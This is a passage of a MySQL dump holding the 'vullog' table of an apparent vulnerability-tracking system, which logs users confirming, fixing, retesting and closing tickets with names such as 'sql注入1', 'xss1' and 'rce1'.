  `action` text NOT NULL,
  `content` text NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=86 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `vullog`
--

LOCK TABLES `vullog` WRITE;
/*!40000 ALTER TABLE `vullog` DISABLE KEYS */;
INSERT INTO `vullog` VALUES (33,'620ca553b1df1709463aa02d',7,'sql注入1',6,'pentest01','单个漏洞查询',' ',1644995923.7470112),(34,'620ca576b1df1709463aa02e',7,'sql注入1',8,'sec01','单个漏洞查询',' ',1644995958.622969),(35,'620ca809b1df1709463aa03f',7,'sql注入1',1,'admin','漏洞删除',' ',1644996617.909072),(36,'620cab0ab1df1709463aa041',8,'sql注入1',8,'sec01','漏洞确认','感谢提交 ',1644997386.2557943),(37,'620cabe3b1df1709463aa047',8,'sql注入1',7,'develop1','漏洞已知悉(开始修复)',' ',1644997603.1262927),(38,'620cac44b1df1709463aa04d',8,'sql注入1',7,'develop1','漏洞申请复测','麻烦再测试下 ',1644997700.2434974),(39,'620cae4db1df1709463aa054',9,'xss1',8,'sec01','漏洞确认',' ',1644998221.7122326),(40,'620cae64b1df1709463aa05a',9,'xss1',7,'develop1','漏洞已知悉(开始修复)',' ',1644998244.4742281),(41,'620caf86b1df1709463aa060',9,'xss1',10,'anheng','漏洞申请复测',' ',1644998534.514581),(42,'620cb11cb1df1709463aa06c',10,'sql2',8,'sec01','漏洞确认',' ',1644998940.918286),(43,'620cb189b1df1709463aa072',10,'sql2',7,'develop1','漏洞已知悉(开始修复)',' ',1644999049.391307),(44,'620cb1aeb1df1709463aa078',10,'sql2',7,'develop1','漏洞申请复测',' ',1644999086.4298224),(45,'620cb1efb1df1709463aa07e',10,'sql2',10,'anheng','单个漏洞查询',' ',1644999151.6693385),(46,'620cb229b1df1709463aa07f',10,'sql2',8,'sec01','漏洞完成',' ',1644999209.1888046),(47,'620cb6a2b1df1709463aa08a',11,'xss2',8,'sec01','漏洞确认',' ',1645000354.6003654),(48,'620df3d7b1df1709463aa090',9,'xss1',8,'sec01','漏洞完成','yixiufu ',1645081559.0403442),(49,'620df54fb1df1709463aa096',11,'xss2',8,'sec01','漏洞已知悉(开始修复)',' ',1645081935.6831977),(50,'620df55ab1df1709463aa09c',11,'xss2',8,'sec01','漏洞申请复测',' ',1645081946.929746),(51,'620df560b1df1709463aa0a2',11,'xss2',8,'sec01','漏洞完成',' ',1645081952.0169365),(52,'620df647b1df1709463aa0a9',12,'rce1',8,'sec01','漏洞确认',' ',1645082183.2452512),(53,'620df6b9b1df1709463aa0af',12,'rce1',7,'develop1','漏洞已知悉(开始修复)',' ',1645082297.879814),(54,'620df6ccb1df1709463aa0b5',12,'rce1',7,'develop1','漏洞申请复测',' ',1645082316.3626988),(55,'620df703b1df1709463aa0bb',12,'rce1',8,'sec01','漏洞完成',' ',1645082371.022194),(56,'620df706b1df1709463aa0c1',8,'sql注入1',8,'sec01','漏洞完成',' ',1645082374.6519256),(57,'620df76bb1df1709463aa0c8',13,'rce2',8,'sec01','漏洞确认',' ',1645082475.4534414),(58,'620df77eb1df1709463aa0ce',13,'rce2',8,'sec01','漏洞已知悉(开始修复)',' ',1645082494.839071),(59,'620df78ab1df1709463aa0d4',13,'rce2',8,'sec01','漏洞申请复测',' ',1645082506.066233),(60,'620df7a3b1df1709463aa0da',13,'rce2',8,'sec01','漏洞完成',' ',1645082531.5530944),(61,'620dfaa7b1df1709463aa0e4',14,'sql_gs',10,'anheng','单个漏洞查询',' ',1645083303.2818027),(62,'620dfb18b1df1709463aa0e7',16,'rce_gs',8,'sec01','漏洞确认',' ',1645083416.1047673),(63,'620dfb1fb1df1709463aa0ed',15,'rce_ah',8,'sec01','漏洞确认',' ',1645083423.7149968),(64,'620dfb2ab1df1709463aa0f3',14,'sql_gs',8,'sec01','漏洞驳回',' ',1645083434.1894794),(65,'620e013db1df1709463aa101',17,'sql_kaifa2',8,'sec01','漏洞确认',' ',1645084989.183469),(66,'620e0146b1df1709463aa109',17,'sql_kaifa2',8,'sec01','漏洞已知悉(开始修复)',' ',1645084998.9193974),(67,'620e0c44b1df1709463aa114',18,'aaa',8,'sec01','单个漏洞查询',' ',1645087812.6429331),(68,'620e0c5ab1df1709463aa115',18,'aaa',8,'sec01','漏洞确认',' ',1645087834.2554567),(69,'620e0c98b1df1709463aa11b',17,'sql_kaifa2',10,'anheng','单个漏洞查询',' ',1645087896.3255699),(70,'620e0db0b1df1709463aa11c',16,'rce_gs',9,'guoshun','漏洞已知悉(开始修复)',' ',1645088176.129932),(71,'620e0e5bb1df1709463aa129',8,'sql注入1',10,'anheng','单个漏洞查询',' ',1645088347.0604424),(72,'620e0f24b1df1709463aa12a',18,'aaa',1,'admin','漏洞已知悉(开始修复)',' ',1645088548.1228955),(73,'620e0f2bb1df1709463aa130',18,'aaa',1,'admin','漏洞申请复测',' ',1645088555.292468),(74,'620f5063b1df1709463aa143',17,'sql_kaifa2',7,'develop1','单个漏洞查询',' ',1645170787.3178823),(75,'620f50eab1df1709463aa144',16,'rce_gs',7,'develop1','单个漏洞查询',' ',1645170922.164608),(76,'620f5113b1df1709463aa145',17,'sql_kaifa2',7,'develop1','漏洞申请复测',' ',1645170963.1828277),(77,'620f59b1b1df1709463aa154',18,'aaa',1,'admin','单个漏洞查询',' ',1645173169.5468),(78,'6212eee9b1df1709463aa156',19,'sql_4',8,'sec01','漏洞新增/编辑',' ',1645407977.3237507),(79,'62132b4b887ab8b7c2881a00',19,'sql_4',1,'admin','单个漏洞查询',' ',1645423435.4132774),(80,'62132c7e887ab8b7c2881a01',18,'aaa',1,'admin','单个漏洞查询',' ',1645423742.9054503),(81,'62132c94887ab8b7c2881a02',19,'sql_4',1,'admin','单个漏洞查询',' ',1645423764.1697657),(82,'62132ce6887ab8b7c2881a03',19,'sql_4',1,'admin','单个漏洞查询',' ',1645423846.1774495),(83,'62133aaa887ab8b7c2881a07',19,'sql_4',1,'admin','单个漏洞查询',' ',1645427370.43182),(84,'62133bfb887ab8b7c2881a08',17,'sql_kaifa2',10,'anheng','漏洞完成',' ',1645427707.170934),(85,'62134175887ab8b7c2881a09',15,'rce_ah',10,'anheng','漏洞已知悉(开始修复)',' ',1645429109.2975116);
/*!40000 ALTER TABLE `vullog` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-02-21  8:13:01
